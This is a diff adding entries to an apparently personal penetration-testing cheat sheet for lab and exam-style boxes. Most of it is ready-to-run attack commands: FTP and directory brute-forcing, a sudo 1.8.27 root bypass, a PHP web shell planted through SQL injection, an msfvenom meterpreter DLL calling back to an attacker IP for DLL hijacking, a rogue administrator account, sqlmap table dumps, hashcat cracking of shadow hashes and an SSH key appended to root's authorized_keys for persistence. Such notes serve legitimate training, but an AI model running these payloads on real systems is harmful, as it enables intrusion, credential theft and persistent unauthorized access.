@@ -20,6 +20,9 @@ Massscan UDP all ports:
 Nmap Vulnerable Scripts TCP Ports:
 `nmap -T4 -sV --script vuln -p 80,443,8080 $IP`
 
+Ffuf Directory Brute Force: (Fastest)
+`ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://$IP/FUZZ`
+
 Gobuster Directory Brute Force: (recommend first using common.txt wordlist)
 `gobuster dir -u http://$IP/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp,txt" -z"`
 
@@ -52,6 +55,9 @@ SSH Brute Force (Super slow, since max 4 threads. Use small wordlist):
 
 SSH prompts wrong key exchange method:
 `ssh -oKexAlgorithms=diffie-hellman-group1-sha1 root@$IP`
+
+DNSrecon Reverse Lookup (Recommended use of a valid domain):
+`dnsrecon -r 127.0.0.0/24 -n $IP -d blah`
 
 DNS Zone Transfer any domain:
 `dig axfr @$IP`
@@ -122,6 +128,10 @@ finger admin@$IP
 ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
 ```
 
+## Brute Force
+
+FTP: `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 10.0.0.1 ftp`
+
 # Reverse Shells or Shell access
 
 Reverse Shell Payloads: x
@@ -157,7 +167,8 @@ droopescan to scan moodle:
 
 For linux look at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
-For Windows look at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+For Windows look at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md   
+Also: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
 
 Linux binaries with SUID: https://gtfobins.github.io/
 
@@ -179,17 +190,37 @@ Interesting binaries with SUID: `find / -perm -u=s -type f 2>/dev/null`
 
 Sensitive readable files: `find / -name id_rsa 2> /dev/null` or `find / \( -name id_rsa -o -name authorized_keys -o -name wp-config.php\) 2> /dev/null`
 
-Find Writable files: `find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
+Find Writable files: ``find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null``
 
 Find folder or file recursively: `find / -name '.git' 2>/dev/null`
 
 Find Cronjobs: `cat /etc/cron*` better yet, download binary x to find hidden cronjobs
 
+If sudo version is version 1.8.27 and user is able to run bash as sudo: `sudo -u#-1 /bin/bash`
+Example of vulnerable sudoer:
+```
+User bob may run the following commands on DANTE-NIX04:
+    (ALL, !root) /bin/bash
+```
+
+CEWL a website for potential password dictionary attack: `cewl http://10.0.0.1/wordpress/ >> cwl.pass`
+
+WFUZZ for a file: `wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --filter "c=200" http://10.0.0.1/wordpress/FUZZ.config`
+
 ## Windows
+
+System Information: `systeminfo`
 
 Enumerate all users in the domain: `net user /domain`
 
 Enumerate specific account in the domain: `net user bob`
+
+Privileges: `whoami /all`
+
+IP Information (Dual homed?): `ip config`
+
+Established connections (Local Addr of 0.0.0.0 means its internal ports): `netstat -ano`
+
 
 Use bloodhound to extract AD data:
 ```
@@ -225,7 +256,7 @@ wget http://10.10.14.116:9000/winPEASany.exe
 winPEASany.exe
 ```
 
-AlwaysInstalledElevated - RottenTomato
+AlwaysInstalledElevated - RottenTomato   
 Follow https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated and verify that AlwaysInstallElevated is set to 1 and created a reverse shell using msfvenom and run the payload and capture the NT Authority System reverse shell:
 
 ```
@@ -254,9 +285,50 @@ net user defender password1$ /add
 net localgroup administrators defender /add
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
-#Use any tool to log in locally
+#Use any tool to log in remotely
 wmiexec.py defender@$IP
 ```
+
+Port forward using plink (Example: Have WinLogOn creds but can't winexe since port 445 is only available internal):
+```
+# Local setup
+apt install ssh
+vim /etc/ssh/sshd_config # Allow root to ssh
+service ssh restart
+
+# Download 32 or 64 version: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+## Download to remote windows machine
+plink.exe -l <your username:root> -pw  <your ssh password:toor> -R 445:127.0.0.1:445 <your ip: 10.10.1.1>
+## Linux shell should open
+winexe -U Administrator%Password1! //127.0.0.1 "cmd.exe"
+```
+
+Transfer files from remote to local via FTP:
+```
+# Locally
+python -m pyftpdlib -p 21 --write
+# Remote
+ftp <your ip> # anonymous:anonymous
+put filename.c
+```
+
+DLL Hijacking:
+```
+# If service found with hijackable DLL. Run commands locally and transfer the malicious dll
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.1 LPORT=4444 -f dll -o msf.dll
+# Or make your own: https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/dll-hijacking.md#your-own
+# Possible payload: cmd.exe /k net localgroup administrator bob /add
+# Move it to the destination folder
+sc stop bad-service & sc start bad-service
+```
+
+Service Permissions:
+```
+Placeholder
+```
+
+Check permissions of all folders inside PATH:
+`for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )`
 
 ## Docker Priv Esc
 CVE-2019-5736. Following https://github.com/Frichetten/CVE-2019-5736-PoC , we can create a sh binary that will overwrite /bin/sh on the docker instance. This will let us elevate to a root shell.
@@ -288,8 +360,30 @@ chmod +x main
 sudo docker exec -it dockername /bin/sh
 ```
 
+## General
+
+SQL injection upload backdoor php file: `"<?php echo
+shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
+
+SQLmap to get tables:
+```
+sqlmap 'http://127.0.0.1/dict/test.php?id=1' --dbs --batch
+sqlmap 'http://127.0.0.1/dict/test.php?id=1' --tables -D phpmyadmin
+sqlmap 'http://127.0.0.1/dict/test.php?id=1' --dump -D phpmyadmin -T users
+```
+
 # Pivot
 
 Use SSHUTTLE to route all traffic through a machine:
 `sshuttle -r admin@$IP <internal host 1> <internal host 2> <etc>`
 
+Find connected hosts in internal network: `route -nee && arp -e`
+
+Do a port scan with netcat (Good when pivoting): `nc -zv 172.16.0.1 1-65535 2>&1 | grep succeeded`
+
+## Pillage
+
+Crack shadow hash:
+`hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt`
+
+Add to your public key to box: `echo '...' >> /root/.ssh/authorized_keys`
